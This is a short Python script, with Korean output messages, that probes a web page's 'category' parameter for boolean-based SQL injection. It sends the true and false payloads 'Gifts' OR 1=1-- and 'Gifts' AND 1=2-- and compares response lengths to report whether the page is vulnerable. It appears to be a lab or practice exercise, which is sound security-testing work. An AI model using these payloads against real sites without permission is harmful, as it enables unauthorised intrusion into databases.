import requests

def send_request(url, payload):
    params = {"category": payload}
    res = requests.get(url, params=params)
    return res.text

def run_boolean(url):
    print("\n[Boolean SQL Injection 테스트 시작]\n")

    base_payload = "Gifts"
    true_payload = "Gifts' OR 1=1--"
    false_payload = "Gifts' AND 1=2--"

    base_res = send_request(url, base_payload)
    true_res = send_request(url, true_payload)
    false_res = send_request(url, false_payload)

    base_len = len(base_res)
    true_len = len(true_res)
    false_len = len(false_res)

    print(f"[Baseline] {base_len}")
    print(f"[True] {true_len}")
    print(f"[False] {false_len}")

    print("\n[분석 결과]")

    if true_len > base_len:
        print("▶ True 조건에서 데이터 증가 확인")

    if false_len < base_len:
        print("▶ False 조건에서 데이터 감소 확인")

    if true_len > base_len and false_len < base_len:
        print("\n🔥 SQL Injection 취약점 확인 (Boolean 기반)")
    else:
        print("\n❌ 취약점 확인 실패")